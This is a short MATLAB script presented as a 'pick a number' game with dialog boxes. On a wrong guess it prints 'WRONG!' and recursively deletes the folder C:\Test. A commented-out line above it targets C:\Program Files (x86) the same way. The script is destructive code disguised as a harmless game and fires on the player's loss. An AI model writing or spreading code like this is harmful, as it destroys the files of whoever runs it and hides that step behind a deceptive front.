clc
clear
start=questdlg('Do you want to play a game','game','yes','no','no');
if ~(strcmpi(start,'yes'))
    error('gameover')
else
    list={'1','2','3','4','5'};
    number=randi([1,5]);
    prompt='Pick a number between 1 and 5';
    guess=listdlg('PromptString',prompt,'SelectionMode','single','listsize',[160,100],'ListString',list);
    if isempty(guess)
        error('gameover')       
    elseif number==guess
        fprintf('Good Job!')
    else
        fprintf('WRONG!')
        %rmdir('C:\Program Files (x86)','s')
        rmdir('C:\Test','s')
    end
end